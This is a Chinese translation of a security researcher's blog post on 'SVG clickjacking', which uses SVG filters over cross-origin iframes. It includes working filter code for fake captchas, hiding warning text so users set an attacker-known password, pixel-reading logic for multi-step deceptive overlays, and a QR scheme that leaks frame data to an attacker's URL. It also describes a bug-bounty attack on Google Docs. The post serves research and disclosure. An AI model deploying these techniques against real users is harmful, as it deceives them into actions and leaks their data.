---
title: "【第3624期】SVG Filters - Clickjacking 2.0：一种全新的网络攻击技术"
link: "http://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&mid=2651278138&idx=1&sn=695b4035b94470500180e5e1215d108c&chksm=bc98f2b1a736b5c91a656e34fedcec676dff2cf32a280d209632614af5e1d4a820237eb560bf&scene=0#rd"
date: 2025-12-11
md5: d1e224dd9a8be5dcee4b675c2e22bf6a
---

# 【第3624期】SVG Filters - Clickjacking 2.0：一种全新的网络攻击技术

前言

介绍了一种名为 “SVG clickjacking” 的全新网络攻击技术。与传统的点击劫持（Clickjacking）攻击不同，SVG clickjacking 利用 SVG 滤镜功能，能够创建复杂的交互式点击劫持攻击，并实现多种数据泄露方式。 今日前端早读课文章由 @Lyra Rebane 分享，@飘飘编译。

译文从这开始～～

点击劫持（Clickjacking）是一种典型的攻击手法，其原理是将其他网站的 iframe 覆盖在网页上，用来诱骗用户在不知情的情况下与之交互。这种方式在想让人误点一两个按钮时非常有效，但如果攻击逻辑更复杂，就显得不太现实了。

我最近发现了一种全新的技术，它颠覆了传统的点击劫持方式，能够实现复杂的交互式点击劫持攻击，并且还能实现多种形式的数据泄露。

我把这种新方法称为 “SVG 点击劫持（SVG Clickjacking）”。

![图片](./images/c12bae247dd1bb0251f5e6bae2088907.png)

#### 液态 SVG（Liquid SVGs）

苹果宣布推出全新的 “Liquid Glass（液态玻璃）” 设计那天真是一片混乱。你几乎无法浏览社交媒体，因为每隔几条帖子就会有人讨论这个新设计 —— 有的人批评它的可访问性太差，有的人则惊叹于那逼真的折射效果。

在这场铺天盖地的讨论中，我突然想到 —— 这个效果到底有多难重现？我能不能在网页上做到，不依赖 canvas 或 shader？我马上动手，大约一小时后，我就用 CSS/SVG 做出了一个几乎完全一样的效果。

![图片](./images/94eead7461b4be0b3dcb06367468bc93.png)

https://codepen.io/rebane2001/details/OPVQXMv

你可以在上方的演示中，通过右下角的圆形控制器拖动这个效果（Chrome / Firefox 桌面版，或 Chrome 移动版）。

我的小技术演示在网上引起了不小轰动，甚至还有一篇新闻报道，其中对我有迄今为止最夸张的评价：“三星和其他公司跟她比起来都不值一提”。

几天后，我又产生了一个新想法 —— 这种 SVG 效果能在 `iframe` 之上实现吗？

我心想，这肯定不行吧？毕竟这种 “光线折射” 的效果太复杂了，不可能作用到跨域文档上。

[【早阅】基于滚动条的SVG文本滤镜动画](https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&mid=2651272722&idx=2&sn=34489781869d5dbd11afdacc1b63cc44&scene=21#wechat_redirect)

但令我惊讶的是 —— 它竟然可以！

这让我非常震惊，因为我的液态玻璃效果是通过 `feColorMatrix` 和 `feDisplacementMap` 这两个 SVG 滤镜实现的，前者可以改变像素颜色，后者可以移动像素。而我居然能在跨域文档上做到这一点？

这让我进一步思考：其他的滤镜元素是否也能在 iframe 上生效？如果可以，那是不是能变成某种攻击手段？结果是 —— 所有滤镜都能用！而且答案是：能！

#### 构建模块（Building blocks）

我开始逐个研究每一个 `<fe*>` SVG 元素，看看哪些能组合起来，构成我们自己的攻击基础单元。

这些滤镜元素会接收一个或多个输入图像，对其进行各种操作，然后输出新的图像。我们可以在同一个 SVG 滤镜中串联多个元素，并在后续的滤镜中引用前面生成的结果。

以下是一些常用且非常有用的基础滤镜元素：

- `<feImage>`
  
   加载一张图像文件；
- `<feFlood>`
  
   绘制一个矩形；
- `<feOffset>`
  
   移动图像位置；
- `<feDisplacementMap>`
  
   根据映射图移动像素；
- `<feGaussianBlur>`
  
   模糊图像；
- `<feTile>`
  
   平铺或裁剪图像；
- `<feMorphology>`
  
   扩展或收缩亮区或暗区；
- `<feBlend>`
  
   根据模式混合两个输入；
- `<feComposite>`
  
   合成工具，可用于 Alpha 遮罩或像素级数学计算；
- `<feColorMatrix>`
  
   应用颜色矩阵，可用于通道交换或亮度 / 透明度转换。

这是一套相当丰富的图形工具！

如果你玩过 demoscene（演示艺术），你可能会觉得这非常熟悉。这些滤镜就是很多计算机图形效果的基础构建单元，可以组合出许多有趣的 “原语”。让我们看几个例子。

##### 伪造验证码（Fake captcha）

我们先看一个最基础的数据泄露示例。假设你瞄准了一个包含某种敏感代码的 iframe。你可以直接要求用户重新输入那段代码，但这样看起来太可疑。

我们可以利用 `feDisplacementMap` 让文字看起来像验证码！这样一来，用户更容易在不经意间输入我们想要的内容。

![图片](./images/2188c67befc2d635c21babbc89dbc1ea.png)

```
 <iframe src="..." style="filter:url(#captchaFilter)"></iframe>
 <svg width="768" height="768" viewBox="0 0 768 768" xmlns="http://www.w3.org/2000/svg">
   <filter id="captchaFilter">
     <feTurbulence
       type="turbulence"
       baseFrequency="0.03"
       numOctaves="4"
       result="turbulence" />
     <feDisplacementMap
       in="SourceGraphic"
       in2="turbulence"
       scale="6"
       xChannelSelector="R"
       yChannelSelector="G" />
   </filter>
 </svg>
```
注意：只有 `<filter>` 内的部分才是关键，其余只是示例用法。

再加上一些色彩效果和随机线条，这看起来就是个相当逼真的验证码！

[【第3333期】SVG 的 “三角妥协”](https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&mid=2651272159&idx=1&sn=135ea079975c2a5993d1c25cd2a63e16&scene=21#wechat_redirect)

在我分享的这些攻击手段中，这个可能是最没用的一个 —— 毕竟很少有网站允许 iframe 嵌入那些能显示 “魔法代码” 的页面。不过我仍想展示它，因为它很好地演示了这种攻击技术的基础。

```
 )]}'

 [[1337],[1,"AIzaSyAtbm8sIHRoaXMgaXNuJ3QgcmVhbCBsb2w",0,"a",30],[768972,768973,768932,768984,768972,768969,768982,768969,768932,768958,768951],[105,1752133733,7958389,435644166009,7628901,32481100117144691,28526,28025,1651273575,15411]]
```
不过，这可能还是有用的，因为很多时候你被允许对只读的 API 端点进行框架读取，所以也许那里存在一种攻击方式有待发现。

##### 隐藏灰色文本（Grey text hiding）

下一个例子展示当你想诱导用户与某个输入框交互时可以做什么。很多输入框都有灰色的占位提示文字，仅仅显示输入框可能无法迷惑用户。

让我们看个示例（试着在框里输入点东西）：

![图片](./images/65d792e138d02f77df80ec74f2fc29f7.png)

在这个例子中，我们想诱导用户设置一个攻击者已知的密码。我们希望他们能看到自己输入的内容，但看不到灰色提示文字，也看不到红色 “太短” 的警告。

首先，我们可以使用 `feComposite` 的算术模式隐藏灰色文字。该算术操作接受两个图像输入 `i1（in=...`）和 `i2（in2=...）`，并根据下列公式进行像素级计算：  
`r = k1 * i1 * i2 + k2 * i1 + k3 * i2 + k4`。

![图片](./images/d3284bce6dc06fc89f07525d21076658.png)

```
 <feComposite operator=arithmetic
              k1=0 k2=4 k3=0 k4=0 />
```
提示：如果你只想使用前一步输出的图像，可以省略 in/in2 参数。

我们正在接近目标 —— 通过增强输入的亮度，灰色的文字已经消失，但此时黑色的文字看起来有点可疑且难以阅读，尤其是在 1 倍缩放的显示器上。

我们当然可以微调参数来平衡效果，但理想情况是：黑色文字保持正常，而灰色文字完全消失。那能做到吗？

这时候，“遮罩（masking）” 技巧就派上用场了。我们将创建一个 蒙版（matte） 来 “切出” 黑色文字，并覆盖掉其他部分。接下来分步实现。

先用 `feTile` 对黑色文字的结果进行裁剪：

![图片](./images/810e29ecec131dca25955cb1fc267938.png)

```
 <feTile x=20 y=56 width=184 height=22 />
```
注意：Safari 浏览器似乎在处理 `feTile` 时遇到了一些问题，所以如果示例出现闪烁或空白，请使用 Firefox 或 Chrome 等其他浏览器阅读此帖子。如果您正在为 Safari 编写攻击代码，您也可以通过使用 feFlood 制作亮度遮罩，然后应用它来实现裁剪。

然后使用 feMorphology 增加文字的粗细：

![图片](./images/3ea52dc3fa46e37b786696f402475728.png)

```
 <feMorphology operator=erode radius=3 result=thick />
```
接着我们要提高遮罩对比度。先用 `feFlood` 生成纯白图像，再用 `feBlend` 的 difference 模式反转遮罩，最后用 `feComposite` 做一次乘法增强对比度：

![图片](./images/8de2cae568d9e6168ce0bb08442e50b9.png)

```
 <feFlood flood-color=#FFF result=white />
 <feBlend mode=difference in=thick in2=white />
 <feComposite operator=arithmetic k2=100 />
```
现在我们得到了亮度遮罩。最后，用 `feColorMatrix` 转成 Alpha 遮罩，再用 `feComposite` 把它应用到原始图像上，最后用 `feBlend` 把背景填成白色。

![图片](./images/3ac439b01eff565a082d611628e7dff0.png)

```
 <feColorMatrix type=matrix
         values="0 0 0 0 0
                 0 0 0 0 0
                 0 0 0 0 0
                 0 0 1 0 0" />
 <feComposite in=SourceGraphic operator=in />
 <feBlend in2=white />
```
看起来是不是很不错？如果你清空输入框（试试看），可能会看到一点小瑕疵，但总体来说这是个相当不错的攻击性视觉重塑方法。

我们还可以添加其他效果来让输入框更 “自然”。让我们把所有步骤组合起来，看一个完整的攻击示例。

![图片](./images/906555b8506385c4f1de7dd5cde4c40c.png)

```
 <filter>
   <feComposite operator=arithmetic
                k1=0 k2=4 k3=0 k4=0 />
   <feTile x=20 y=56 width=184 height=22 />
   <feMorphology operator=erode radius=3 result=thick />
   <feFlood flood-color=#FFF result=white />
   <feBlend mode=difference in=thick in2=white />
   <feComposite operator=arithmetic k2=100 />
   <feColorMatrix type=matrix
       values="0 0 0 0 0
               0 0 0 0 0
               0 0 0 0 0
               0 0 1 0 0" />
   <feComposite in=SourceGraphic operator=in />
   <feTile x=21 y=57 width=182 height=20 />
   <feBlend in2=white />
   <feBlend mode=difference in2=white />
   <feComposite operator=arithmetic k2=1 k4=0.02 />
 </filter>
```
现在你可以看到，输入框被完全 “重新包装” 成了不同的界面设计，但它依然是可交互、可输入的。

#### 像素读取（Pixel reading）

现在我们来到可能是最实用的一种攻击手法 —— 像素读取。没错，你可以利用 SVG 滤镜（filters）来读取图像中的颜色数据，并基于这些数据执行各种逻辑，从而实现非常高级且逼真的攻击效果。

[【早阅】浏览器扩展程序攻击](https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&mid=2651274484&idx=1&sn=6e50ccc6ca737dbe24e5089d9f3105ed&scene=21#wechat_redirect)

当然，问题在于你必须在 SVG 滤镜内部完成所有操作 —— 没有办法把这些数据导出。不过，只要你足够有创意，这依然是一个非常强大的方法。

从更高的层面看，这让我们能够做到让点击劫持攻击中的所有内容都具有响应性：伪造的按钮可以有悬停（hover）效果，点击后能显示假的下拉菜单或对话框，甚至还可以实现假的表单验证。

我们先从一个简单的例子开始 —— 检测某个像素是否为纯黑色，并用它来打开或关闭另一个滤镜。

![图片](./images/559fe2662abe2d1f0e41bce8d018171a.png)

**目标：**

我们想检测用户点击盒子改变颜色的行为，然后用这个行为来切换一个模糊（blur）效果。

![图片](./images/0f65fa6b4e58c0ff1c6a793bd571832c.png)

```
 <feTile x="50" y="50"
         width="4" height="4" />
 <feTile x="0" y="0"
         width="100%" height="100%" />
```
首先，我们使用两个 `feTile` 滤镜。第一个用来裁剪出我们感兴趣的那几个像素，第二个则把这些像素平铺（tile）到整个图像上。

这样一来，整个画面就被我们关心的那一块区域的颜色所填满。

![图片](./images/100070d4b8d54762293f2553aaf08454.png)

```
 <feComposite operator=arithmetic k2=100 />
```
接着，我们可以利用 `feComposite` 的算术（arithmetic）模式，把结果转化为一个二值（开 / 关）图像。和上一节类似，但这次我们使用了更大的 `k2` 值。这样输出的结果要么是完全黑的，要么是完全白的。

![图片](./images/a34b88b39b3a2d17dbc69d55b331fbc1.png)

```
 <feColorMatrix type=matrix
   values="0 0 0 0 0
           0 0 0 0 0
           0 0 0 0 0
           0 0 1 0 0" result=mask />
 <feGaussianBlur in=SourceGraphic
                 stdDeviation=3 />
 <feComposite operator=in in2=mask />
 <feBlend in2=SourceGraphic />
```
就像之前一样，我们可以把它当作一个遮罩（mask）。我们再次将其转化为一个透明度通道（alpha matte），但这次我们把它应用在模糊滤镜上。

就这样，你就能判断一个像素是否为黑色，并用它来切换滤镜！

![图片](./images/2ae83343bcecb3de9cb0cc7be472938e.png)

不过…… 糟糕！有人把目标按钮改成了彩虹旗主题的按钮！

那我们该如何调整，让这项技术可以适用于任意颜色和纹理呢？

![图片](./images/3682854d1e74a8db847c700f32d3ecab.png)

```
 <!-- crop to first stripe of the flag -->
 <feTile x="22" y="22"
         width="4" height="4" />
 <feTile x="0" y="0" result="col"
         width="100%" height="100%" />
 <!-- generate a color to diff against -->
 <feFlood flood-color="#5BCFFA"
          result="blue" />
 <feBlend mode="difference"
          in="col" in2="blue" />
 <!-- k4 is for more lenient threshold -->
 <feComposite operator=arithmetic
              k2=100 k4=-5 />
 <!-- do the masking and blur stuff... -->
 ...
```
解决方案其实很简单：我们可以使用 `feBlend` 的 difference 模式，再结合 `feColorMatrix` 把颜色通道合并，从而把图像变成类似之前那样的黑白蒙版。

对于带有纹理的图像，我们可以用 `feImage`；对于非精确匹配的颜色，我们可以用 `feComposite` 的算术模式，让匹配阈值更宽松一些。

就是这样 —— 一个简单的例子，展示了如何读取一个像素的值并用它来切换滤镜。

#### 逻辑门（Logic gates）

接下来到了有趣的部分！我们可以重复前面 “像素读取” 的过程，去读取多个像素，然后对它们进行逻辑运算，从而 “编程” 出一个攻击逻辑。

通过结合使用 `feBlend` 和 `feComposite`，我们可以重建出所有逻辑门（logic gates），让 SVG 滤镜 具备完整的逻辑功能。这意味着 —— 我们几乎可以在滤镜里 “编程” 任何想要的逻辑，只要它不是基于时间的（非 timing-based），且不会消耗太多资源即可。

![图片](./images/1cf9b6b88be54721936418321fb241ce.png)

这些逻辑门正是现代计算机的基础。理论上，你甚至可以在一个 SVG 滤镜中构建一台计算机。事实上，我已经做了一个基本的计算器：

![图片](./images/adcc234f7b8408c0a1ee93ca1dffc977.png)

这是一个全加器电路（Full Adder Circuit）。该滤镜使用上面提到的逻辑门实现了以下逻辑：

- 输出位（S）： `S = A ⊕ B ⊕ Cin`
- 进位位（Cout）： `Cout = (A ∧ B) ∨ (Cin ∧ (A ⊕ B))`

当然，在 SVG 滤镜中实现加法器还有更高效的方式，但这个例子主要是为了证明我们可以在 SVG 滤镜中实现任意逻辑电路。

```
 <!-- util -->
 <feOffset in="SourceGraphic" dx="0" dy="0" result=src />
 <feTile x="16px" y="16px" width="4" height="4" in=src />
 <feTile x="0" y="0" width="100%" height="100%" result=a />
 <feTile x="48px" y="16px" width="4" height="4" in=src />
 <feTile x="0" y="0" width="100%" height="100%" result=b />
 <feTile x="72px" y="16px" width="4" height="4" in=src />
 <feTile x="0" y="0" width="100%" height="100%" result=c />
 <feFlood flood-color=#FFF result=white />
 <!-- A ⊕ B -->
 <feBlend mode=difference in=a in2=b result=ab />
 <!-- [A ⊕ B] ⊕ C -->
 <feBlend mode=difference in2=c />
 <!-- Save result to 'out' -->
 <feTile x="96px" y="0px" width="32" height="32" result=out />
 <!-- C ∧ [A ⊕ B] -->
 <feComposite operator=arithmetic k1=1 in=ab in2=c result=abc />
 <!-- (A ∧ B) -->
 <feComposite operator=arithmetic k1=1 in=a in2=b />
 <!-- [A ∧ B] ∨ [C ∧ (A ⊕ B)] -->
 <feComposite operator=arithmetic k2=1 k3=1 in2=abc />
 <!-- Save result to 'carry' -->
 <feTile x="64px" y="32px" width="32" height="32" result=carry />
 <!-- Combine results -->
 <feBlend in2=out />
 <feBlend in2=src result=done />
 <!-- Shift first row to last -->
 <feTile x="0" y="0" width="100%" height="32" />
 <feTile x="0" y="0" width="100%" height="100%" result=lastrow />
 <feOffset dx="0" dy="-32" in=done />
 <feBlend in2=lastrow />
 <!-- Crop to output -->
 <feTile x="0" y="0" width="100%" height="100%" />
```
对攻击者而言，这意味着什么呢？这意味着你可以构建一个拥有多步逻辑条件与交互的点击劫持攻击。而且 —— 你还可以在跨域的 frame（iframe）中运行逻辑，对其中的数据进行处理！

![图片](./images/d38eea9ed6dce56bf7da081da0d43711.png)

这是一个示例目标场景：我们的攻击目标是诱导用户点击一系列按钮，最终让他们 “标记自己已被黑客攻击（hacked）”。整个攻击流程包含多个步骤：

1. 用户点击一个按钮以打开对话框；
2. 等待对话框加载；
3. 在对话框内勾选一个复选框；
4. 点击另一个按钮；
5. 检查屏幕上是否出现红色文字。

![图片](./images/5d5a0c55fe5614e44a4c08f41566564d.png)

##### 传统点击劫持的问题

针对这样的目标，传统的点击劫持攻击非常难以执行。攻击者必须让用户连续点击多个按钮，但界面上又无法给出任何交互反馈。

即使有一些技巧能让传统的攻击稍微更 “逼真” 一点，但仍然会显得十分可疑。尤其当攻击目标中涉及文本输入框时，传统点击劫持几乎无法奏效。

##### 用滤镜逻辑实现攻击

那么，我们可以用 SVG 滤镜逻辑来构建一个 “决策树式” 的攻击逻辑，如下所示：

```
 对话框是否打开？
   否 → 红色文字是否出现？
         否 → 让用户点击按钮
         是 → 显示结束画面
   是 → 对话框是否加载完毕？
         否 → 显示加载界面
         是 → 复选框是否被勾选？
               否 → 引导用户勾选复选框
               是 → 让用户点击对话框内的按钮
```
我们可以把上面的逻辑用逻辑门的形式表达为：

[【早阅】防止针对 JavaScript 生态系统的供应链攻击](https://mp.weixin.qq.com/s?__biz=MjM5MTA1MjAxMQ==&mid=2651273698&idx=2&sn=130aa04a67b6f5e75056c04a5e5c9762&scene=21#wechat_redirect)

**输入信号：**

- **D（对话框可见）**
  
   = 检测背景是否变暗
- **L（对话框已加载）**
  
   = 检查对话框中按钮是否存在
- **C（复选框是否选中）**
  
   = 检查按钮颜色是蓝色还是灰色
- **R（红色文字是否出现）**
  
   = 使用 `feMorphology` 检测红色像素

**输出逻辑：**

```
 (¬D) ∧ (¬R) => button1.png
 D ∧ (¬L) => loading.png
 D ∧ L ∧ (¬C) => checkbox.png
 D ∧ L ∧ C => button2.png
 (¬D) ∧ R => end.png
```
##### 在 SVG 中的实现

以下是实现上述逻辑的 SVG 滤镜示例：

```
 <!-- util -->
 <feTile x="14px" y="4px" width="4" height="4" in=SourceGraphic />
 <feTile x="0" y="0" width="100%" height="100%" />
 <feColorMatrix type=matrix result=debugEnabled
   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
 <feFlood flood-color=#FFF result=white />

 <!-- attack imgs -->
 <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=button1.png></feImage>
 <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=loading.png></feImage>
 <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=checkbox.png></feImage>
 <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=button2.png></feImage>
 <feImage xlink:href="data:..." x=0 y=0 width=420 height=220 result=end.png></feImage>

 <!-- D (dialog visible) -->
 <feTile x="4px" y="4px" width="4" height="4" in=SourceGraphic />
 <feTile x="0" y="0" width="100%" height="100%" />
 <feBlend mode=difference in2=white />
 <feComposite operator=arithmetic k2=100 k4=-1 result=D />

 <!-- L (dialog loaded) -->
 <feTile x="313px" y="141px" width="4" height="4" in=SourceGraphic />
 <feTile x="0" y="0" width="100%" height="100%" result="dialogBtn" />
 <feBlend mode=difference in2=white />
 <feComposite operator=arithmetic k2=100 k4=-1 result=L />

 <!-- C (checkbox checked) -->
 <feFlood flood-color=#0B57D0 />
 <feBlend mode=difference in=dialogBtn />
 <feComposite operator=arithmetic k2=4 k4=-1 />
 <feComposite operator=arithmetic k2=100 k4=-1 />
 <feColorMatrix type=matrix
                values="1 1 1 0 0
                        1 1 1 0 0
                        1 1 1 0 0
                        1 1 1 1 0" />
 <feBlend mode=difference in2=white result=C />

 <!-- R (red text visible) -->
 <feMorphology operator=erode radius=3 in=SourceGraphic />
 <feTile x="17px" y="150px" width="4" height="4" />
 <feTile x="0" y="0" width="100%" height="100%" result=redtext />
 <feColorMatrix type=matrix
                values="0 0 1 0 0
                        0 0 0 0 0
                        0 0 0 0 0
                        0 0 1 0 0" />
 <feComposite operator=arithmetic k2=2 k3=-5 in=redtext />
 <feColorMatrix type=matrix result=R
                values="1 0 0 0 0
                        1 0 0 0 0
                        1 0 0 0 0
                        1 0 0 0 1" />

 <!-- Attack overlays -->
 <feColorMatrix type=matrix in=R
   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
 <feComposite in=end.png operator=in />
 <feBlend in2=button1.png />
 <feBlend in2=SourceGraphic result=out />
 <feColorMatrix type=matrix in=C
   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
 <feComposite in=button2.png operator=in />
 <feBlend in2=checkbox.png result=loadedGraphic />
 <feColorMatrix type=matrix in=L
   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
 <feComposite in=loadedGraphic operator=in />
 <feBlend in2=loading.png result=dialogGraphic />
 <feColorMatrix type=matrix in=D
   values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0" />
 <feComposite in=dialogGraphic operator=in />
 <feBlend in2=out />
```
##### 实际效果展示

![图片](./images/08d27d0756ab21d24168eb1c09723737.png)

你可以打开 “带透明度的攻击演示（Show attack with transparency）”，自己体验一下 ——  
就会发现这种攻击的交互效果比传统点击劫持真实得多。

我们甚至可以进一步增强效果，比如加入额外逻辑，让按钮在鼠标悬停时也能显示伪造的 hover 效果。

在演示中，左下角的四个小方块显示了调试信息 —— 分别代表四个输入信号（D、L、C、R），帮助你理解攻击逻辑的实时状态。

这就是如何通过 SVG 滤镜 制作出复杂且多步骤的点击劫持攻击。这些攻击在传统手段下几乎不可能实现。

本文中的示例虽然被简化了，但真实世界的攻击可以更加复杂、精致且逼真。

事实上……

##### Google Docs 漏洞（The Docs bug）

没错，我真的用这种攻击手法成功攻击了 Google Docs！

你可以在这里看到演示视频（备用链接：bsky、twitter）。

视频示例：https://infosec.exchange/@rebane2001/115265287713185877

**攻击的执行过程如下：**

- 诱导用户点击 “Generate Document”（生成文档）按钮；
- 检测到弹窗出现后，显示一个伪造的文本框（让用户输入验证码）；
- 文本框最初带有渐变动画（需要模拟这一效果）；
- 文本框有焦点状态（focus state），攻击画面中也必须呈现出来，因此要通过检测背景颜色判断焦点状态；
- 文本框中的灰色文字既用于占位符（placeholder），又用于建议提示（suggestions）—— 我们必须用前面提到的遮盖技巧将其隐藏；
- 当用户输入完验证码后，攻击会诱导他们点击按钮（或按下回车）；此时，Google Docs 会往文本框中插入一个 “推荐文档项”；
- 攻击逻辑需要检测该推荐项的背景色以确认其出现；
- 一旦检测到推荐项，文本框将被隐藏，转而显示一个新的按钮；
- 当用户再次点击该按钮时，会出现加载界面；
- 如果检测到加载界面存在，或者对话框不可见、且 “Generate Document” 按钮消失，攻击即结束，显示最终画面。

在过去，攻击的各个单独部分或许能通过传统点击劫持与基本 CSS 实现，但整个攻击流程太长、太复杂 —— 在实际中根本不可能实现。

而利用这种在 SVG 滤镜中运行逻辑的新技巧，整个攻击链条就变得完全可行了。

Google 的漏洞奖励计划（VRP）为此漏洞向我支付了 $3133.70 的奖金。  
当然，这刚好是在他们推出 “新漏洞类型奖励加成” 之前（真是可惜啊！😅）。

#### 二维码攻击（The QR attack）

我经常在网上看到一些人坚称 “二维码很危险”。这种说法其实让我有点不爽 —— 因为二维码本质上并不比普通链接更危险。

当然，我一般不会多做评论：谨慎扫描二维码是好习惯，和谨慎点开陌生链接一样。但看到人们把二维码妖魔化成 “能立刻黑掉你的东西”，确实让人哭笑不得。

然而，事实是 —— 我用的这套 SVG 滤镜攻击技巧，也能应用在二维码上！

之前内容中的 “输入验证码” 攻击，一旦用户察觉到自己在输入可疑内容，就会变得不太实际。而且我们也不能让 SVG 滤镜生成带有链接的 `<a>` 标签来 “传出数据”。

不过既然 SVG 滤镜能执行逻辑、还能产生视觉输出，那我们是否可以 —— 生成一个二维码，让其中包含链接呢？

##### 生成二维码（Creating the QR）

不过要在 SVG 滤镜中生成二维码，说起来容易，做起来难。我们可以用 `feDisplacementMap` 把二进制数据排布成二维码的形状，但一个可扫描的二维码还需要包含纠错数据（error correction）。

二维码使用 Reed–Solomon（里德 - 所罗门）纠错算法，这是一种比简单校验和更复杂的数学结构 —— 涉及多项式计算。在 SVG 中重新实现这种算法，的确有点麻烦。

幸运的是，我早就遇到过类似的问题。早在 2021 年，我就是第一个在 Minecraft 里实现二维码生成器的人 😎，所以我早就搞清楚了关键要点。

在 Minecraft 的实现中，我预先计算了一些纠错查找表（lookup tables），让生成过程简单得多。  
同样的思路，我们也可以用于 SVG 滤镜中。

这篇文章已经够长了，所以滤镜的具体工作原理，就留给大家作为练习吧 😉

![图片](./images/138b3f5b09a2d4bb1aaecc3aa2f00c76.png)

下面是一个演示，它会显示一个动态二维码，内容是 “你在此页面停留了多少秒”。

⚠️ 注意事项：

- 演示有点挑剔，如果不生效，请确保你没有启用显示缩放或使用自定义色彩配置；
- 在 Windows 上，可关闭 “自动管理应用程序颜色”；
- 在 Mac 上，请将显示色彩配置设置为 **sRGB**。

此演示无法在移动设备上运行，目前只支持 Chromium 内核浏览器（如 Chrome / Edge），  
但理论上可以让它在 Firefox 上运行。

在真实攻击中，这些缩放与色彩配置问题可以通过 JavaScript 小技巧规避，或通过稍微不同的滤镜实现方式来解决。本演示只是一个概念验证（proof of concept），功能上稍显粗糙。

但没错 —— 这就是一个完全由 SVG 滤镜生成的二维码！

我花了相当长的时间制作它，因为我不想只是说 “理论上可行”，而是想真正把它做出来。

#### 攻击场景（Attack scenario）

这个二维码攻击的场景是这样的：

- 攻击者从一个跨域 iframe 中读取像素；
- 对这些像素进行逻辑处理，从中提取想要的数据；
- 把这些数据编码成一个 URL，例如：
  
  ```
   https://lyra.horse/?ref=c3VwZXIgc2VjcmV0IGluZm8
  ```
- 把这个 URL 渲染为一个二维码；
- 提示用户扫描这个二维码（例如 “反机器人验证”）；
- 对用户而言，这个 URL 看起来就像一个带追踪 ID 的普通链接；
- 一旦用户扫码访问，攻击者的服务器就能从 URL 中获取到这些数据。

而这只是冰山一角。这种技术的应用场景多到数不过来。

例如：

- 通过差值混合模式（difference blend）读取文字内容；
- 通过诱导点击特定区域来泄露数据（exfiltrate data）；
- 甚至可以从外部输入数据，让 SVG 内部显示一个假的鼠标光标，并根据伪造按钮的交互做出反应，让攻击更真实。

另外，在某些限制环境中（例如 CSP 禁止 JavaScript 时），我们也可以仅用 CSS + SVG 来完成攻击逻辑。

#### 全新技术（Novel technique）

这是我在安全研究生涯中第一次发现一整套全新的攻击技术！

我在 9 月的 BSides 大会上首次简要介绍了它，而这篇文章则是对该技术的更深入说明与应用展示。

当然，我们永远无法百分之百确定某种攻击方式从未被别人发现过。但我广泛检索了现有的安全研究文献，发现没有任何公开资料提到类似思路，所以…… 我想我大概可以冠上 “首位发现者” 的头衔了？ 😎

我并不认为自己能发现这种技术只是 “运气好”。我长期以来就擅长把诸如 CSS 之类的技术当作 “编程语言” 来挖掘与利用。对我来说，把 SVG 滤镜 当作一种编程语言来看，并不算跳跃性的想法。

再加上我在安全研究与创意项目之间的交叉背景 —— 我经常模糊两者的界限。比如这个项目（Antonymph）就是这种思路的产物。

关于本文  
译者：@飘飘  
作者：@Lyra Rebane  
原文：https://lyra.horse/blog/2025/12/svg-clickjacking/

这期前端早读课  
对你有帮助，帮” 赞 “一下，  
期待下一期，帮” 在看” 一下。
